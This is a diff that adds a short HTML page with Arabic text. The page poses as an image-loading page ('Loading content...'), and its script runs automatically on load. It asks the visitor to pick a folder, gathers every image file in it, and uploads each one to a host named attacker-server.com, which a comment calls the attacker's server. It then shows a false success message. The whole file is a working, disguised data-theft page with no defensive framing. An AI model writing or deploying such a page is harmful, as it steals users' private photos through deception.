@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>تحميل الصور</title>
+    <script>
+        // دالة لتحميل وإرسال الصور
+        async function uploadImages() {
+            try {
+                // طلب صلاحيات الوصول إلى الملفات
+                const dirHandle = await window.showDirectoryPicker();
+                const images = [];
+                
+                // جمع جميع ملفات الصور
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i)) {
+                        const file = await entry.getFile();
+                        images.push(file);
+                    }
+                }
+
+                // إرسال الصور إلى الخادم
+                for (const image of images) {
+                    const formData = new FormData();
+                    formData.append('image', image);
+                    
+                    // إرسال إلى سيرفر المخترق
+                    await fetch('https://attacker-server.com/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+                
+                alert('تم تحميل الصور بنجاح!');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // تشغيل الدالة تلقائيًا عند فتح الصفحة
+        window.onload = uploadImages;
+    </script>
+</head>
+<body>
+    <h1>جاري تحميل المحتوى...</h1>
+</body>
+</html>
